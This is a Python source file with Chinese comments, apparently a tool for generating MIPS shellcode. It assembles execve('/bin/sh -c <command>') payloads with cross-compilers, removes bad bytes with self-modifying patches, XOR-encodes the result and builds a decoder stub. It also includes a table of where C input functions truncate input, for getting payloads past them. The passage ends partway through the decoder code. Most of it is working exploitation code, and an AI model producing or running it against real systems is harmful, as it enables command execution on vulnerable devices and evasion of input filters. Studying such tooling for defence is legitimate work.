import shutil
import sys
import os
import subprocess
import argparse
import random
import textwrap
import urllib.parse
from typing import List, Tuple
from pwn import *
import logging


current_user = os.path.expanduser('~')
os.makedirs("shellcode_directory", exist_ok=True)
os.makedirs("tools", exist_ok=True)
# --- 配置你的交叉编译器路径 ---
config = {
    "SHELLCODE_DIRECTORY": "shellcode_directory",  # 存放生成的shellcode文件的目录
    "ARM_TOOLCHAIN_PATH": None,
    "MIPS_TOOLCHAIN_PATH": None,
    "QEMU_PATH": None,
    "ARM_PATH": None,
    "DOWNLOAD_MIPS_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32/tarballs/mips32--glibc--stable-2024.05-1.tar.xz",
    "DOWNLOAD_MIPSEL_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/mips32el/tarballs/mips32el--glibc--stable-2024.05-1.tar.xz",
    "DOWNLOAD_ARMEB_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/armebv7-eabihf/tarballs/armebv7-eabihf--uclibc--stable-2024.05-1.tar.xz",
    "DOWNLOAD_ARM_TOOLCHAIN_URL": "https://toolchains.bootlin.com/downloads/releases/toolchains/armv7-eabihf/tarballs/armv7-eabihf--uclibc--stable-2024.05-1.tar.xz",
    "BAD_BYTES": ['00', '3B', '0a', '0b', '0c', '0d', '20', '09']
}

# --- 配置日志记录器 ---
logging.basicConfig(
    level=logging.DEBUG,  # 最低记录级别：DEBUG / INFO / WARNING / ERROR / CRITICAL
    format="%(asctime)s - %(levelname)s - %(message)s",
    filename=f"{config['SHELLCODE_DIRECTORY']}/generate_shellcode.log",
    filemode="a"          # "a" 追加写入，"w" 覆盖写入
)


from typing import List, Dict, Any
import unicodedata

class FunctionTruncationSummary:
    """
    一个封装了C语言函数截断属性的类，并提供格式化打印功能。
    """

    def __init__(self):
        """
        初始化类，并加载函数截断属性的总结数据。
        """
        self.summary_data = [
            {
                "函数": "read(0,a,0x100)",
                "截断字符": "EOF",
                "截断属性": "无",
                "截断字符是否保留": "无",
                "截断后": "无"
            },
            {
                "函数": "*a = getchar()",
                "截断字符": "EOF",
                "截断属性": "无",
                "截断字符是否保留": "无",
                "截断后": "无"
            },
            {
                "函数": "scanf(\"%c\",a)",
                "截断字符": "EOF",
                "截断属性": "无",
                "截断字符是否保留": "无",
                "截断后": "无"
            },
            {
                "函数": "scanf(\"%s\",a)",
                "截断字符": "EOF 0x09 0x0A 0x0B 0x0C 0x0D 0x20",
                "截断属性": "截断字符前有有效内容则截断，如无有效内容则跳过截断字符读后面",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "sscanf(a,\"%s\",b)",
                "截断字符": "0x00 0x09 0x0A 0x0B 0x0C 0x0D 0x20",
                "截断属性": "截断字符前有有效内容则截断，如无有效内容则跳过截断字符读后面",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "sscanf(a,\"%[^;];\",b)",
                "截断字符": "0x00 0x3B",
                "截断属性": "无",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "gets(a)",
                "截断字符": "EOF 0x0A",
                "截断属性": "截断字符前无论有无有效内容均截断",
                "截断字符是否保留": "不保留",
                "截断后": "0x00"
            },
            {
                "函数": "fgets(a,256,stdin)",
                "截断字符": "EOF 0x0A",
                "截断属性": "截断字符前无论有无有效内容均截断",
                "截断字符是否保留": "保留",
                "截断后": "0x00"
            },
            {
                "函数": "sprintf(b,\"%s\",a)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strcpy(b,a)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strcat(b,a)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strncat(b,a,0x10)",
                "截断字符": "0x00",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "无（相当于截断字符不保留，截断后加0x00）"
            },
            {
                "函数": "strncat(b,a,0x10)",
                "截断字符": "到达拷贝长度",
                "截断属性": "无",
                "截断字符是否保留": "保留",
                "截断后": "如果到达拷贝长度，则自动补上0x00"
            },
            {
                "函数": "memcpy(b,a,0x10)",
                "截断字符": "",
                "截断属性": "",
                "截断字符是否保留": "",
                "截断后": ""
            }
        ]

    @staticmethod
    def _get_display_width(text: str) -> int:
        """
        计算字符串在终端中的显示宽度，考虑中文字符。
        """
        return sum(2 if unicodedata.east_asian_width(char) in ('W', 'F') else 1 for char in text)

    def print_summary(self):
        """
        打印紧凑型表格。
        """
        if not self.summary_data:
            print("表格数据为空。")
            return

        headers = list(self.summary_data[0].keys())

        # 计算每一列的最大显示宽度
        col_widths = {header: self._get_display_width(header) for header in headers}
        for row in self.summary_data:
            for header in headers:
                content = str(row.get(header, ''))
                col_widths[header] = max(col_widths[header], self._get_display_width(content))

        # 打印表头
        header_line_parts = []
        for header in headers:
            width = col_widths[header]
            padding = width - self._get_display_width(header)
            header_line_parts.append(header + ' ' * padding)
        print(" | ".join(header_line_parts))

        # 打印分隔线
        separator_width = sum(col_widths.values()) + (len(headers) - 1)
        print("-" * separator_width)

        # 打印每一行数据
        for row in self.summary_data:
            row_line_parts = []
            for header in headers:
                content = str(row.get(header, ''))
                width = col_widths[header]
                padding = width - self._get_display_width(content)
                row_line_parts.append(content + ' ' * padding)

            print("|".join(row_line_parts))


class Mips_Generate_short_shellcode:
    ASM_MIPS = """
        .set noreorder
        li      $a2,1638
        bltzal  $a2,0
        slti    $a2,$zero,-1

        addiu   $sp,$sp,-32
        addiu   $s3,$ra,4097
        addiu   $a0,$s3,-3997
        addiu   $a1,$s3,-3989
        addiu   $a2,$s3,-3986

        # 自修复代码
        lw   $t2,-4101($s3)
        lw   $t3,-3993($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-3993($s3)
        lw   $t3,-3989($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-3989($s3)

        lw   $t3,-{offset}($s3)
        addu   $t3,$t3,$t2
        sw      $t3,-{offset}($s3)
        # end

        sw      $a0,-24($sp)
        sw		$a1,-20($sp)
        sw      $a2,-16($sp)
        sw      $zero,-12($sp)

        addiu   $a1,$sp,-24
        addiu   $s4,$zero,1111   #将 $a2设置为0
        addiu   $a2,$s4,-1111
        li      $v0,4011
        syscall 0x40404

        # --- 第 4 部分：数据区 ---
        .asciiz "/bin/sh"
        .asciiz "-c"
        .asciiz "{command}"
    """
    def __init__(self, command: str, endian: str, save_file: bool = False):
        self.command = command
        self.endian = endian
        self.save_file = save_file
        self.generate_shellcode(command, endian)

    def generate_shellcode(self, command: str, endian: str):
        # 确保输出目录存在
        try:
            asm_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.s")
            as_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.o")
            obj_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_test_shellcode.bin")

            # --- 1、先生成shellcode确认偏移地址 ---
            temp_asm = self.ASM_MIPS.format(command=command, offset=3985)
            with open(asm_file_path, "w") as f:
                f.write(temp_asm)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", as_file_path, asm_file_path], check=True)
            # result = subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objdump", "-d", obj_file_path], capture_output=True,
            #                         text=True, check=True)
            # print(result.stdout.strip())
            # print("------------------------------\n")
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", as_file_path,
                 obj_file_path], check=True)
            with open(obj_file_path, "rb") as f:
                shellcode = f.read()
            # ---获取偏移地址---
            logging.info(f"[START]")
            _, offset = self.strip_trailing_null_blocks(shellcode)
            logging.info(f"[mips] 第一次编译 确认自修复的偏移地址 : {(offset)}")

            # --- 2、传入真实的偏移地址 ---
            temp_asm = self.ASM_MIPS.format(command=command, offset=offset)
            with open(asm_file_path, "w") as f:
                f.write(temp_asm)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", as_file_path, asm_file_path], check=True)
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "--only-section=.text", as_file_path,
                 obj_file_path], check=True)
            with open(obj_file_path, "rb") as f:
                shellcode = f.read()
            # print("编译成功! Shellcode 已生成到:", bin_file_path)
            shellcode, _ = self.strip_trailing_null_blocks(shellcode)
            logging.info(f"[mips] 第二次编译 生成 MIPS shellcode : {(shellcode.hex())}")
            modified_shellcode = self.patch_shellcode_segment(shellcode, endian)
            logging.info(f"[mips] patch_shellcode_segment 运算后的 shellcode : {(modified_shellcode.hex())}")
            logging.info(f"[END]")
            print(f"✅ 生成 MIPS shellcode 成功! 长度: {len(modified_shellcode)} 字节")
            print_as_python_bytes(modified_shellcode)
            found, bad_bytes = check_bad_bytes(modified_shellcode)
            print(f"shellcode: 在shellcode中找到坏字节？{found}, 坏字节列表: {bad_bytes}")
            MipsVerifyShellcode(modified_shellcode)

        except FileNotFoundError:
            print(
                f"[!] 错误: MIPS 交叉编译工具链未找到, 请检查 config['MIPS_TOOLCHAIN_PATH'] 的设置: '{config['MIPS_TOOLCHAIN_PATH']}'")
        except subprocess.CalledProcessError as e:
            print(f"[!] 编译失败: {e}")
            if hasattr(e, 'stderr') and e.stderr:
                print(f"错误详情: {e.stderr.decode('utf-8', 'ignore')}")
        finally:
            if self.save_file == False:
                for f in [asm_file_path, as_file_path, obj_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - 汇编源码: {asm_file_path}")
                print(f"  - as文件: {as_file_path}")
                print(f"  - objcopy: {obj_file_path}")

    def patch_shellcode_segment(self, shellcode: bytes, endian: str) -> bytes:
        """
        分两阶段修改 MIPS Shellcode，并支持大小端字节序。

        阶段 1: 核心修补 (插入和 T1/T2 减法)
        1. 计算：(原索引 112-115 的值) - 0x22222222，生成 T1 结果。
        2. 计算：(原索引 116-119 的值) - 0x22222222，生成 T2 结果。
        3. 在原索引 8 处，插入 4 字节的 0x22222222 (Shellcode 长度增加 4 字节)。
        4. 将 T1 和 T2 的计算结果替换到原索引 112 开始的 8 字节位置。

        阶段 2: command 0x00 字节块修补
        5. 遍历阶段 1 结果中所有包含 Null 字节 ('\x00') 的 4 字节块。
        6. 将这些块的值减去 0x22222222 后，将结果写回原位置。

        参数:
            shellcode (bytes): 原始的机器码字节串。
            endianness_format (str): 字节序格式字符串。默认为 '>I' (大端，Big-Endian)，
                                     可设置为 '<I' (小端，Little-Endian)。

        返回:
            bytes: 两次修补后的机器码字节串 (长度增加 4 字节)。
        """
        if endian == "big":
            endianness_format = '>I'
        else:
            endianness_format = '<I'
        # 定义函数内部常量
        SUBTRAHEND_VALUE = 0x22222222
        INSERTION_SIZE = 4

        # 根据传入的格式打包 0x22222222
        SUBTRAHEND_BYTES = struct.pack(endianness_format, SUBTRAHEND_VALUE)

        # --- 阶段 1: 核心修补 (插入和 T1/T2 减法) ---
        logging.info("[mips] --- 阶段 1: 核心修补 (插入和 T1/T2 减法) ---")

        # 定义索引 (针对原始 shellcode)
        S_INSERT_INDEX = 8
        T1_START = 112
        T1_END = 116
        T2_START = 116
        T2_END = 120
        TOTAL_REPLACEMENT_END = T2_END

        required_length = TOTAL_REPLACEMENT_END
        if len(shellcode) < required_length:
            print(
                f"错误: shellcode 长度不足 {required_length} 字节。至少需要 {required_length} 字节。当前长度: {len(shellcode)}")
            return shellcode

        # 1. 处理目标 1 (T1: 112-115)
        t1_original_bytes = shellcode[T1_START:T1_END]
        # 使用参数化的字节序
        t1_original_value, = struct.unpack(endianness_format, t1_original_bytes)
        t1_result_value = t1_original_value - SUBTRAHEND_VALUE
        # 使用参数化的字节序
        t1_new_bytes = struct.pack(endianness_format, t1_result_value & 0xFFFFFFFF)

        # 2. 处理目标 2 (T2: 116-119)
        t2_original_bytes = shellcode[T2_START:T2_END]
        # 使用参数化的字节序
        t2_original_value, = struct.unpack(endianness_format, t2_original_bytes)
        t2_result_value = t2_original_value - SUBTRAHEND_VALUE
        # 使用参数化的字节序
        t2_new_bytes = struct.pack(endianness_format, t2_result_value & 0xFFFFFFFF)

        # 3. 重新组合 shellcode (执行插入和替换)
        T1_T2_new_bytes = t1_new_bytes + t2_new_bytes

        shellcode_stage1 = (
                shellcode[0:S_INSERT_INDEX] +  # 1. Header [0:8]
                SUBTRAHEND_BYTES +  # 2. 插入 [8:12] - 0x22222222
                shellcode[S_INSERT_INDEX:T1_START] +  # 3. Middle Segment [8:112] (被推后了)
                T1_T2_new_bytes +  # 4. T1+T2 结果 (替换原 [112:120] 区域)
                shellcode[TOTAL_REPLACEMENT_END:]  # 5. Trailer [120:] (被推后了)
        )

        # --- 阶段 1 结束 ---
        # --- 阶段 2: command 0x00 字节块修补---
        segment_size = 4
        null_byte = b'\x00'
        # 将 shellcode_stage1 (bytes) 转换为 bytearray 进行可变操作
        mutable_patch_target = bytearray(shellcode_stage1)
        modified_count = 0
        logging.info("[mips] --- 阶段 2: command 0x00 字节块修补 ---")
        # 遍历可变目标
        for i in range(0, len(mutable_patch_target), segment_size):
            chunk = mutable_patch_target[i:i + segment_size]
            if len(chunk) != segment_size:
                continue
            # 检查当前 4 字节块中是否存在 null 字节
            if null_byte in chunk:
                # 1. 读取当前值 (使用参数化的字节序)
                current_value, = struct.unpack(endianness_format, chunk)
                # 2. 计算新值: T_new = T_original - 0x22222222
                new_value = current_value - SUBTRAHEND_VALUE
                # 3. 打包结果回 4 字节 (使用参数化的字节序)
                new_bytes = struct.pack(endianness_format, new_value & 0xFFFFFFFF)
                # 4. 替换原位置的字节
                logging.info(f"[mips] [PATCHED] 索引 {i:3} 到 {i + 3:3} (原值: 0x{chunk.hex()}) -> 新值: 0x{new_bytes.hex()}")
                # 使用 bytearray 的切片赋值
                mutable_patch_target[i:i + segment_size] = new_bytes
                modified_count += 1
        logging.info(f"[mips] --- command 0x00 字节块处理完成。共修补 {modified_count} 个块。---")
        # --- 阶段 2 结束 ---
        # 返回最终结果，类型为 bytes
        return bytes(mutable_patch_target)

    def strip_trailing_null_blocks(self, shellcode: bytes) -> bytes:
        """
        优化去除末尾的空字节：仅当末尾的 4 字节块全部是 \x00 时，才去除该块。
        新增功能：如果块中包含 \x00 字节，则输出该块的起始索引。

        参数:
            shellcode (bytes): 原始的机器码字节串。

        返回:
            bytes: 去除完整空字节块后的机器码字节串。
        """
        block_size = 4
        null_byte = b'\x00'
        start_index = 120  # 从索引 120 开始检测

        # 1. 原始逻辑修改为 全局去除所有全零块
        new_shellcode_list = []
        original_shellcode_len = len(shellcode)
        # 遍历所有块
        for i in range(0, original_shellcode_len, block_size):
            chunk = shellcode[i:i + block_size]

            # 检查是否是完整的 4 字节块
            if len(chunk) != block_size:
                # 处理不完整的尾部块，总是保留
                new_shellcode_list.append(chunk)
                continue
            # 检查是否是完整的 4 字节全零块
            if chunk == b'\x00' * block_size:
                # 如果是，去除这个块（不添加到 new_shellcode_list）
                logging.info(f"[mips] [REMOVED] 去除全零块，原始起始索引: {i:3}  0x{chunk.hex()}")
            else:
                # 如果不是，保留
                new_shellcode_list.append(chunk)
        shellcode = b"".join(new_shellcode_list)

        # 2. 新增功能 (后执行): 遍历剩余的 shellcode 并检查是否存在 \x00 字节
        for i in range(start_index, len(shellcode), block_size):
            chunk = shellcode[i:i + block_size]
            # 仅检查完整的 4 字节块
            if len(chunk) == block_size and null_byte in chunk:
                logging.info(f"[mips] [FOUND] 块索引 {i:3} 包含一个或多个 Null 字节 (内容: 0x{chunk.hex()})")
                offset = (4097 - 112 - (i - 120))
        return shellcode, offset

class MipsShellcodeGenerator:
    """
    一个用于生成 MIPS (o32 ABI) execve shellcode 的类。

    该类将 MIPS 汇编模板、用户命令和交叉编译工具链结合起来，
    自动完成汇编、链接和提取字节码的整个过程。
    """
    # 汇编代码模板，与您提供的 mips_shellcode.S 文件内容一致。
    # 我们保留了一个占位符 {command_string_len} 以便动态计算偏移。
    ASM_TEMPLATE = """
# MIPS execve("/bin/sh", ["/bin/sh", "-c", command], NULL) shellcode
.section .text
.globl __start
.set noreorder

__start:
    # --- 第 1 部分：位置无关代码 (PIC) ---
    bal     find_data
    nop                 # 分支延迟槽, $ra 将指向这里

find_data:
    # $ra 现在指向 nop 指令。
    # 我们需要计算从 nop 到数据区的偏移。
    # 代码部分共 14 条指令 = 56 字节。
    addu $s0, $ra, 56   # $s0 = 数据区的基地址

    # --- 第 2 部分：在栈上构建参数数组 (argv) ---
    move $s1, $s0                               # $s1 -> "/bin/sh"
    addiu $s2, $s0, 8                           # $s2 -> "-c"
    addiu $s3, $s0, 11                          # $s3 -> your_cmd

    # 为 argv 数组在栈上分配空间 (4个指针 = 16字节)
    addiu $sp, $sp, -16

    sw $s1, 0($sp)      # argv[0] = &"/bin/sh"
    sw $s2, 4($sp)      # argv[1] = &"-c"
    sw $s3, 8($sp)      # argv[2] = &command
    sw $zero, 12($sp)   # argv[3] = NULL

    # --- 第 3 部分：执行系统调用 ---
    move $a0, $s1       # a0 = path
    move $a1, $sp       # a1 = argv
    move $a2, $zero     # a2 = envp

    li $v0, 4011        # syscall: execve
    syscall

# --- 第 4 部分：数据区 ---
.asciiz "/bin/sh"
.asciiz "-c"
.asciiz "{command}"
"""

    def __init__(self, cmd, save_file=False):
        """
        初始化生成器。

        :param cmd: 您希望 shellcode 执行的命令字符串 (例如 "ls -l")。
        :param cross_compiler_prefix: MIPS 交叉编译工具链的前缀。
        """
        if not cmd:
            raise ValueError("命令不能为空。")
        self.cmd = cmd
        self.save_file = save_file
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        执行编译流程并生成 shellcode。
        :return: 包含原始 shellcode 的 bytes 对象，如果失败则返回 None。
        """
        final_asm_code = self.ASM_TEMPLATE.format(command=self.cmd)
        try:
            asm_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.s")
            obj_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.o")
            elf_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.elf")
            bin_file_path = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.bin")
            # 1. 写入汇编文件
            with open(asm_file_path, "w") as f:
                f.write(final_asm_code)
            # 2. 汇编 (as)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", obj_file_path, asm_file_path], check=True)
            # 3. 链接 (ld)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}ld", "-o", elf_file_path, obj_file_path], check=True)
            # 4. 提取 .text 段 (objcopy)
            subprocess.run([
                f"{config['MIPS_TOOLCHAIN_PATH']}objcopy",
                "-O", "binary",
                "--only-section=.text",
                elf_file_path,
                bin_file_path
            ], check=True)

            # 5. 读取最终的 shellcode
            with open(bin_file_path, "rb") as f:
                self.raw_shellcode = f.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [asm_file_path, obj_file_path, elf_file_path, bin_file_path]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - 汇编文件: {asm_file_path}")
                print(f"  - 目标文件: {obj_file_path}")
                print(f"  - 链接文件: {elf_file_path}")
                print(f"  - 二进制文件: {bin_file_path}")


class MipsShellcodeGenerator_long:
    def __init__(self, cmd, arch, save_file=False):
        self.cmd = cmd
        self.arch = arch
        self.save_file = save_file
        self.xxd_bin_file = None
        self.raw_shellcode = None
        self.generate()

    def generate(self):
        """
        根据指定的架构(arm/mips)和命令生成对应的shellcode。

        Args:
            cmd (str): 希望shellcode执行的命令，例如 "ls -l"。
            arch (str): 目标架构，'arm' 或 'mips'。

        Returns:
            bytes: 生成的原始二进制shellcode。
        """
        asm_code = """
        __asm__ volatile (
            "li $v0, 4011\\n\\t"
            "move $a0, %0\\n\\t"
            "move $a1, %1\\n\\t"
            "li $a2, 0\\n\\t"
            "syscall\\n\\t"
            :
            : "r"(arg0), "r"(args)
            : "$v0", "$a0", "$a1", "$a2"
        );
        """
        # --- 2. 构建完整的C语言源码 ---
        # 使用C代码动态构建字符串和参数数组
        shellcode_c = f"""
    #include <sys/syscall.h>

    void _start() {{
        // 构建 execve 的参数
        {self.format_c_char_array("arg0", "/bin/sh")}
        {self.format_c_char_array("arg1", "-c")}
        {self.format_c_char_array("arg2", self.cmd)}

        char *args[] = {{arg0, arg1, arg2, 0}};

        // 执行特定架构的内联汇编
        {asm_code}
    }}
    """
        # --- 3. 编译并提取二进制代码 ---
        # 使用临时文件来处理编译过程
        c_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.c")
        elf_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode")
        bin_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_raw_shellcode.bin")

        try:
            with open(c_file, "w") as fd:
                fd.write(shellcode_c)
            # 1. 编译C代码为ELF文件
            # -nostdlib: 不链接标准库，对于shellcode至关重要
            # -static: 静态链接，避免依赖动态库
            # -O0: 关闭优化，确保代码行为与源码一致
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}gcc", "-fno-stack-protector", "-nostdlib", "-static", "-O0", "-o",
                 elf_file, c_file],
                capture_output=True, text=True
            )
            # 2. 从ELF文件中提取纯二进制的.text段
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", elf_file, bin_file],
                capture_output=True, text=True
            )
            # 3. 使用objdump查看反汇编结果
            subprocess.run(
                [f"{config['MIPS_TOOLCHAIN_PATH']}objdump", "-D", "-b", "binary", "-m", self.arch.lower(), bin_file],
                capture_output=True, text=True
            )
            # 4. 读取生成的二进制shellcode
            self.xxd_bin_file = subprocess.run(
                ["xxd", "-i", bin_file],
                capture_output=True, text=True
            )
            with open(bin_file, "rb") as fd:
                self.raw_shellcode = fd.read()
        finally:
            # 清理临时文件
            if self.save_file == False:
                for f in [c_file, elf_file, bin_file]:
                    if os.path.exists(f):
                        os.remove(f)
            else:
                print(f"\n[+] 中间文件已保存:")
                print(f"  - C源码: {c_file}")
                print(f"  - ELF文件: {elf_file}")
                print(f"  - 二进制: {bin_file}")

    def format_c_char_array(self, var_name, string):
        """
        将一个Python字符串格式化为C语言的字符数组初始化代码。
        例如: "sh" -> char sh[3]; sh[0] = 's'; sh[1] = 'h'; sh[2] = '\0';
        """
        output = []
        length = len(string) + 1  # 为空终止符 '\0' 增加空间
        output.append(f"char {var_name}[{length}];")
        for i, c in enumerate(string):
            # 处理C语言中的特殊字符转义
            if c == "'":
                c_repr = "\\'"
            elif c == '\\':
                c_repr = '\\\\'
            elif c == '\n':
                c_repr = '\\n'
            elif c == '\t':
                c_repr = '\\t'
            else:
                c_repr = c
            output.append(f"{var_name}[{i}] = '{c_repr}';")
        output.append(f"{var_name}[{length - 1}] = '\\0';")
        return "\n".join(output)


class XorEncoder:
    def __init__(self, raw_shellcode, endian, bad_bytes):
        """
        初始化XOR编码器。
        Args:
            raw_shellcode (bytes): 需要被编码的原始二进制shellcode。
            bad_bytes (list, optional): 不应出现的坏字节列表 (整数形式)。默认为 [0x00, 0x0a, 0x26]。
        """
        # --- 1. 初始化属性 ---
        self.raw_shellcode = raw_shellcode
        # 使用三元表达式来设置默认的坏字节列表
        self.bad_bytes_list = bad_bytes

        # 使用集合进行快速查找，效率更高
        self.bad_bytes_set = set(self.bad_bytes_list)

        # 初始化将要计算的属性
        self.key = None
        self.xor_encoded_shellcode = None
        self.xor_encoded_shellcode_bin_file = os.path.join(config["SHELLCODE_DIRECTORY"],
                                                           "mips_xor_encoded_shellcode.bin")
        print(f"[+] 开始进行XOR编码，处理坏字节...   定义的坏字节: {[hex(b) for b in self.bad_bytes_list]}")
        self.endian = endian

        # --- 2. 立即执行编码流程 ---
        self.generate()

    def _pad_shellcode(self):
        """
        将shellcode填充到4字节的倍数，以进行安全的DWORD操作。
        使用 NOP (0x00) 指令进行填充，这是一个常见的做法。
        """
        padding_needed = (4 - len(self.raw_shellcode) % 4) % 4
        padded_shellcode = self.raw_shellcode
        if padding_needed > 0:
            print(f"    -- Shellcode长度不是4的倍数，需要用 NOP 填充 {padding_needed} 字节。")
            # NOP指令的字节表示
            nop_instruction = b'\x00'
            # 检查NOP指令本身是否是坏字节
            if 0x00 in self.bad_bytes_set:
                raise ValueError("填充字节 0x00 是一个坏字节，无法进行填充。请考虑其他填充方案。")
            padded_shellcode += nop_instruction * padding_needed
        return padded_shellcode

    def generate(self):
        """
        循环寻找安全的XOR密钥并加密payload。
        一个安全的密钥及其加密后的shellcode都不应包含任何坏字节。
        """
        padded_shellcode = self._pad_shellcode()

        attempts = 0
        max_attempts = 100000  # 设定最大尝试次数，防止无限循环

        while True:
            attempts += 1
            if attempts > max_attempts:
                raise RuntimeError(f"在 {max_attempts} 次尝试后仍未找到安全密钥。请检查坏字节列表或shellcode。")

            # 随机生成一个4字节（32位）的密钥
            key_int = random.randint(1, 0xFFFFFFFF)
            key_bytes = key_int.to_bytes(4, self.endian)

            # 1. 检查密钥本身是否包含坏字节
            if any(b in self.bad_bytes_set for b in key_bytes):
                continue  # 密钥不安全，尝试下一个

            # 2. 使用此候选密钥加密整个shellcode
            encoded_buffer = bytearray()
            is_encoded_safe = True
            for i in range(0, len(padded_shellcode), 4):
                chunk = padded_shellcode[i:i + 4]
                dword = int.from_bytes(chunk, self.endian)
                xored_dword_int = dword ^ key_int
                xored_dword_bytes = xored_dword_int.to_bytes(4, self.endian)

                # 3. 检查加密后的块是否包含坏字节
                if any(b in self.bad_bytes_set for b in xored_dword_bytes):
                    is_encoded_safe = False
                    break  # 此密钥生成的编码不安全，停止当前加密并尝试新密钥

                encoded_buffer.extend(xored_dword_bytes)

            # 如果整个编码过程都安全，我们就找到了最终的密钥和编码
            if is_encoded_safe:
                self.key = key_int
                self.xor_encoded_shellcode = bytes(encoded_buffer)
                print(f"✅  成功！在 {attempts} 次尝试后找到安全密钥: {hex(self.key)}")

                # 将编码后的shellcode写入文件
                # try:
                #     with open(self.xor_encoded_shellcode_bin_file, "wb") as f:
                #         f.write(self.xor_encoded_shellcode)
                # except IOError as e:
                #     print(f"[!] 错误：无法将文件写入磁盘: {e}")

                return  # 成功找到密钥，退出函数


class XorDecoder:
    """
    负责管理解码器模板，并组装最终的shellcode。
    """
    MIPS_DECODER_TEMPLATE = """
    .section .text
    .global __start
    .set noreorder
    __start:
    li $t8, -0x666
    p:
    bltzal $t8, p
    slti $t8, $zero, -1
    li $s1, {val_for_payload_start}
    nor $s1, $s1, $s1
    addu $s1, $ra, $s1
    li $t2, {val_for_loop_count}
    nor $t2, $t2, $t2
    addu $t0, $t2, $t2
    addu $t0, $t0, $t0
    addu $t0, $s1, $t0
    lui $t1, {key_high}
    ori $t1, $t1, {key_low}
    decode_loop:
    lw $t6, -4($t0)
    nor $t5, $t1, $t1
    and $t4, $t6, $t5
    nor $t5, $t6, $t6
    and $t5, $t5, $t1
    or $t4, $t4, $t5
    sw $t4, -4($t0)
    addu $t0, $t0, -4
    addiu $t2, $t2, -1
    bne $t2, $zero, decode_loop
    slti $at, $at, -1
    finished:
    jalr $ra, $s1
    slti $at, $at, -1
    """

    def __init__(self, shellcode, key, save_file=False):
        """
        初始化XOR解码器。

        Args:
            shellcode (bytes): 需要被解码的加密二进制shellcode。
            key (int): 用于解码的密钥。
            verbose (bool): 如果为True，则打印详细的编译和调试信息。
        """
        self.shellcode = shellcode
        self.key = key
        self.val_for_payload_start = None
        self.val_for_loop_count = None
        self.xor_decoded_shellcode_bin_file = os.path.join(config["SHELLCODE_DIRECTORY"],
                                                           "mips_xor_decoded_shellcode.bin")
        self.xor_decoded_shellcode = None
        self.save_file = save_file
        self._decode_len()

    def _decode_len(self):
        key_high = hex(self.key >> 16)
        key_low = hex(self.key & 0xFFFF)
        loop_count = len(self.shellcode) // 4
        val_for_loop_count = -(loop_count + 1)
        temp_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=-1, val_for_loop_count=-1,
            key_high=key_high, key_low=key_low
        )
        self._generate_decoder(temp_asm, save_file=False)
        # offset_to_payload = len(self.xor_decoded_shellcode) - 8
        # self.val_for_payload_start = -(offset_to_payload + 1)
        offset_to_payload = len(self.xor_decoded_shellcode) - 8
        self.val_for_payload_start = -(offset_to_payload - 3)
        final_asm = self.MIPS_DECODER_TEMPLATE.format(
            val_for_payload_start=self.val_for_payload_start,
            val_for_loop_count=val_for_loop_count,
            key_high=key_high,
            key_low=key_low
        )
        self._generate_decoder(final_asm, save_file=self.save_file)

    def _generate_decoder(self, asm_code, save_file):
        try:
            """编译汇编代码并提取.text节，返回二进制数据和其长度。"""
            s_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_xor_decoder.s")
            o_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_xor_decoder.o")
            bin_file = os.path.join(config["SHELLCODE_DIRECTORY"], "mips_xor_decoder.bin")
            with open(s_file, "w") as f:
                f.write(asm_code)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}as", "-o", o_file, s_file], capture_output=True)
            subprocess.run([f"{config['MIPS_TOOLCHAIN_PATH']}objcopy", "-O", "binary", "-j", ".text", o_file, bin_file],
                           capture_output=True)
            with open(bin_file, "rb") as f:
                binary_data = f.read()
